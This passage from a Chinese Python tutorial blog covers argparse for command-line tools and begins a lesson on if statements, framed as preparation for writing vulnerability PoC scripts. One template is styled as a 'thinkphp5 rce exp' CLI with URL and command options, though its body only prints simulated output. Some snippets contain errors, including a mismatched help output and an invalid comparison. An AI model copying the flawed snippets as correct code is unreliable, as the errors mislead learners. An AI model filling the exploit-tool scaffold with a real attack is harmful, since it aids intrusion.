class="title">exit</span></span></span><br></pre></td></tr></table></figure><p>虽然有个参数的传入 , 但是多多少少不是我们想要的 , 但是不要急 , 一般位置参数是用来做工具中必须传入的参数</p><p>一般都不是用来接收值的 , 而是指定工具如何运行的 , 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scan 位置参数 可以通过这个参数指定工具运行扫描功能</span><br></pre></td></tr></table></figure><p>关于添加位置参数 , 可以给参数设置一些属性 , 比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 默认参数接收的值都是字符串类型, 如果需要其他类型 , 需要使用type指定</span></span><br></pre></td></tr></table></figure><p>使用-h参数 , 可以查看参数的help属性的值</p><h3 id="2-2可选参数"><a href="#2-2可选参数" class="headerlink" title="2.2可选参数"></a>2.2可选参数</h3><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)   <span class="comment">#位置参数前面加上--就变成可选参数</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="comment"># 输入args.url的值</span></span><br><span class="line"><span class="built_in">print</span>(args.url)  <span class="comment"># 默认不指定值的时候为None</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 没有参数直接运行</span><br><span class="line"><span class="function">D:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span></span></span><br><span class="line"><span class="function"><span class="title">None</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 设置参数值</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> --<span class="title">url</span> <span class="title">http</span>://<span class="title">www.mhx.com</span></span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">www.mhx.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看帮助信息</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> -<span class="title">h</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">argparse</span>模块.<span class="title">py</span> [-<span class="title">h</span>] [--<span class="title">url</span> <span class="title">URL</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">optional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">h</span>, --<span class="title">help</span>  <span class="title">show</span> <span class="title">this</span> <span class="title">help</span> <span class="title">message</span> <span class="title">and</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function">  --<span class="title">url</span> <span class="title">URL</span>   <span class="title">input</span> <span class="title">a</span> <span class="title">url</span></span></span><br></pre></td></tr></table></figure><p>多多少少感觉有内味道了</p><h3 id="2-3短选项"><a href="#2-3短选项" class="headerlink" title="2.3短选项"></a>2.3短选项</h3><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>,)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接运行</span></span><br><span class="line">D:\project\SIS2112\day04&gt;python3 argparse模块.py</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment"># 使用短选项</span></span><br><span class="line">D:\project\SIS2112\day04&gt;python3 argparse模块.py -u http://www.mhx.com</span><br><span class="line">http://www.mhx.com</span><br><span class="line"><span class="comment"># 使用长选项</span></span><br><span class="line">D:\project\SIS2112\day04&gt;python3 argparse模块.py --url  http://www.mhx.com</span><br><span class="line">http://www.mhx.com</span><br><span class="line"><span class="comment"># 查看帮助信息</span></span><br><span class="line">D:\project\SIS2112\day04&gt;python3 argparse模块.py -h</span><br><span class="line">usage: argparse模块.py [-h] [-u URL]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>         show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -u URL, --ver VER  increase output ver</span><br></pre></td></tr></table></figure><p>ok , 有那意思了 , 但是不要着急 , 还有一些需要注意的属性（*）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`dest` 通常会作为 `add_argument()`的第一个参数 , 对于可选参数来说 , 默认属性名就是参数名 , 如果有`dest`指定则是`dest值`</span><br><span class="line"></span><br><span class="line">如果你想给一个参数设置一个默认值 , 可以通过`default=1`关键字实现，不指定会返回none</span><br><span class="line">当 `action=&quot;store&quot;`也就是默认的 , 是接收参数存进来的值 , 并存储</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-z&quot;</span>,<span class="string">&quot;--zzz&quot;</span>, dest=<span class="string">&quot;ggg&quot;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>,<span class="built_in">help</span>=<span class="string">&quot;display a square of a given number&quot;</span>,action=<span class="string">&quot;store&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(args.zzz)  # 报错 , 因为指定了dest关键字 , 一般情况下参数名</span></span><br><span class="line"><span class="built_in">print</span>(args.ggg)</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 直接运行 , 打印默认值</span><br><span class="line"><span class="function">D:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span></span></span><br><span class="line"><span class="function">1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 使用短选项指定参数的值 , 注意使用依然是-<span class="title">z</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> -<span class="title">z</span> 1</span></span><br><span class="line"><span class="function">1</span></span><br><span class="line"><span class="function"># 查看帮助</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> -<span class="title">h</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">argparse</span>模块.<span class="title">py</span> [-<span class="title">h</span>] [-<span class="title">z</span> <span class="title">GGG</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">optional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">h</span>, --<span class="title">help</span>         <span class="title">show</span> <span class="title">this</span> <span class="title">help</span> <span class="title">message</span> <span class="title">and</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function">  -<span class="title">z</span> <span class="title">GGG</span>, --<span class="title">zzz</span> <span class="title">GGG</span>  <span class="title">display</span> <span class="title">a</span> <span class="title">square</span> <span class="title">of</span> <span class="title">a</span> <span class="title">given</span> <span class="title">number</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该模块完整手册请见 : <a href="https://docs.python.org/zh-cn/3.8/library/argparse.html">https://docs.python.org/zh-cn/3.8/library/argparse.html</a></p><h3 id="2-4小模板"><a href="#2-4小模板" class="headerlink" title="2.4小模板"></a>2.4小模板</h3><p>至此命令行编程结束 , 看一个小模板 , 加上了一个banner信息和 textwrap模块 换行输出使用信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;真正具体对指定url执行命令的代码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行<span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;thinkphp5 rce exp&#x27;</span>, formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        cve-2022-4334-rce.py -u http://192.168.1.108 -c id   #yong&#x27;t</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot; example: http://www.mhx.com&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;whoami&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;default=whoami example: id&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url, args.cmd)</span><br></pre></td></tr></table></figure><p>运行</p><p><img src="https://i0.hdslb.com/bfs/album/f39f67f893d75f1cb467654377eeb2ceec03ebc5.png" alt="image-20220623150514425"></p><p><strong><code>有那味道了</code></strong></p><p>可能你会好奇那些 poc或者exp显眼的banner信息是如何生成的 , 实际上也很简单就是一些ascii码的字符画</p><p>字符画在线生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">根据文字生成字符画：</span><br><span class="line">http://patorjk.com/software/taag</span><br><span class="line">http://www.network-science.de/ascii/</span><br><span class="line"></span><br><span class="line">根据图片生成字符画：</span><br><span class="line">http://www.degraeve.com/img2txt.php</span><br><span class="line">http://life.chacuo.net/convertphoto2char</span><br><span class="line"></span><br><span class="line">根据流程图生成字符画：</span><br><span class="line">http://asciiflow.com/</span><br><span class="line"></span><br><span class="line">linux上生成字符画</span><br><span class="line">https://www.jeddd.com/article/linux-fancy-text-generator.html</span><br></pre></td></tr></table></figure><p>总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关于命令编程 , 需要掌握的是几种接收用户在命令输入参数值的方式</span><br><span class="line">虽然都能实现 , 但是推荐使用 argparse  模块</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python流程判断</title>
      <link href="/2023/04/02/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8Bif%E5%88%A4%E6%96%AD/"/>
      <url>/2023/04/02/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8Bif%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="流程控制之if判断"><a href="#流程控制之if判断" class="headerlink" title="流程控制之if判断"></a>流程控制之if判断</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个if判断会经常使用 , 后面我们编写poc时候 , 你就深有体会了</span><br><span class="line">因为我们一定会有这样的一个需求 , 就是通过某某某特征 , 判断这个网站有没有这个我们要测试的漏洞</span><br></pre></td></tr></table></figure><h2 id="1-条件"><a href="#1-条件" class="headerlink" title="1. 条件"></a>1. 条件</h2><p>在将if判断之前我们简单说一下什么是条件。</p><blockquote><p>条件的意思是事物存在、发展的影响因素；所具备或处于的状况 —- 来自《北史-郎基转》</p></blockquote><h3 id="1-1-什么可以当做条件"><a href="#1-1-什么可以当做条件" class="headerlink" title="1.1 什么可以当做条件"></a>1.1 什么可以当做条件</h3><p>上面是我们对条件的解释，你听不懂都行，重要的是在python中什么可以当做条件，以及从条件中最终得到什</p><p>么。<strong>所有的条件最终都会返回一个布尔值</strong>，就是我们常说的<code>真和假</code>。那么只要能返回布尔值，就可以当做条件</p><h4 id="1-1-1-显示布尔值"><a href="#1-1-1-显示布尔值" class="headerlink" title="1.1.1 显示布尔值"></a>1.1.1 显示布尔值</h4><p>条件可以是：比较运算 &#x2F; 逻辑运算等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> &gt; <span class="number">2</span>   <span class="comment"># 返回的布尔值是True</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">gender  = <span class="string">&quot;女&quot;</span></span><br><span class="line">age == <span class="number">18</span> <span class="keyword">and</span> gender = <span class="string">&quot;女&quot;</span></span><br></pre></td></tr></table></figure><p>条件可以直接是True&#x2F;False</p><h4 id="1-1-2-隐式布尔值"><a href="#1-1-2-隐式布尔值" class="headerlink" title="1.1.2 隐式布尔值"></a>1.1.2 隐式布尔值</h4><p>所有的数据类型的值都可以当做条件去用 , 要和if连用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,0  1.0  &quot;1&quot; , [1] , &#123;&quot;k1&quot;:&quot;v1&quot;&#125;</span><br></pre></td></tr></table></figure><p>其中 <strong>0，None，空（空字符串，空字典，空列表. . . ）代表的布尔值都是False,</strong> 其余的都是True</p><p>补充 : 在python查看一个值对应的bool值 , 可以通过bool(值) 查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>([]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(&#123;&#125;))</span><br></pre></td></tr></table></figure><h2 id="2-if判断"><a href="#2-if判断" class="headerlink" title="2. if判断"></a>2. if判断</h2><h3 id="2-1-什么是if判断"><a href="#2-1-什么是if判断" class="headerlink" title="2.1 什么是if判断"></a>2.1 什么是if判断</h3><p>实际上if判断在我们的生活中经常用，可能是你没有在意他，因为真的太平常不过了，你只需要把这个if翻译成如果，嘿嘿，是不是有点<code>内味</code>了。脚本小子<code>喜笑颜开</code> , 举一个最常见的，小学老师最喜欢举的例子，如果明天下雨，我就不出去玩了。是不是就是一个因果关系。</p><h3 id="2-2-为什么要有if判断"><a href="#2-2-为什么要有if判断" class="headerlink" title="2.2 为什么要有if判断"></a>2.2 为什么要有if判断</h3><p>就是让计算机&#x2F;程序&#x2F;py脚本 能够像人一样判断一个条件是否成立, 然后再去做某件事的功能。</p><h3 id="2-3-if判断语法"><a href="#2-3-if判断语法" class="headerlink" title="2.3 if判断语法"></a>2.3 if判断语法</h3><h4 id="2-3-1-语法1"><a href="#2-3-1-语法1" class="headerlink" title="2.3.1 语法1"></a>2.3.1 语法1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">    <span class="comment"># 代码1,2,3 属于同一级别的代码,总体称为一组代码块,因为他们缩进相同,都是四个空格.</span></span><br><span class="line">    <span class="comment"># 特点:按照自上而下的方式运行</span></span><br><span class="line">    <span class="comment"># python用缩进来标识代码级别的,但是不能随意缩进</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">gender = <span class="string">&#x27;女&#x27;</span></span><br><span class="line">star = <span class="string">&#x27;水平座&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">16</span> &lt; age &lt; <span class="number">20</span> <span class="keyword">and</span> gender == <span class="string">&#x27;女&#x27;</span> <span class="keyword">and</span> star == <span class="string">&#x27;水平座&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;小明内心非常喜欢, 说道我们能不能在一起呀?...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;其他代码&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码自上而下执行,先执行顶级代码(缩进为0),然后遇到了if,发现了条件成立,执行if下面的次级代码。执行完后再继续执行下面的顶级代码。</span></span><br></pre></td></tr></table></figure><h4 id="2-3-2-语法2"><a href="#2-3-2-语法2" class="headerlink" title="2.3.2 语法2"></a>2.3.2 语法2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="comment"># 当if后面的条件成立,即条件返回True,会执行if下面缩进的代码,else下面缩进的代码不会执行。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当if后面的条件不成立的时候，if下面的代码块不会执行，else下面的代码块这个时候会执行</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">38</span></span><br><span class="line">gender = <span class="string">&#x27;女&#x27;</span></span><br><span class="line">star = <span class="string">&#x27;双子座&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">16</span> &lt; age &lt; <span class="number">20</span> <span class="keyword">and</span> gender == <span class="string">&#x27;女&#x27;</span> <span class="keyword">and</span> star == <span class="string">&#x27;水平座&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我喜欢,我们在一起吧...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;阿姨好,我逗你玩呢...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;其他代码&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-3-语法3"><a href="#2-3-3-语法3" class="headerlink" title="2.3.3 语法3"></a>2.3.3 语法3</h4><p>判断多个条件是否成立，只要一个条件成立就不会再继续判断下面的条件了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>来个小练习, 用户输入分数, 返回成绩等级</p><ul><li>大于等于90   优秀</li><li>大于等于80小于90 良好</li><li>大于等于70小于80 一般</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的分数: &#x27;</span>)</span><br><span class="line">score = <span class="built_in">int</span>(score)</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;优秀&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;良好&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">70</span> &lt;= score &lt; <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;一般&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-4-语法4"><a href="#2-3-4-语法4" class="headerlink" title="2.3.4 语法4"></a>2.3.4 语法4</h4><p>也是if判断的最终版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>:</span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">4</span>:</span><br><span class="line">    代码<span class="number">4</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">5</span></span><br><span class="line"><span class="comment"># 这里的代码5是在所有条件都不成立时,才会执行.</span></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的分数: &#x27;</span>)</span><br><span class="line">score = <span class="built_in">int</span>(score)</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;优秀&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;良好&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">70</span> &lt;= score &lt; <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;一般&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你个小垃圾&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-4-if嵌套"><a 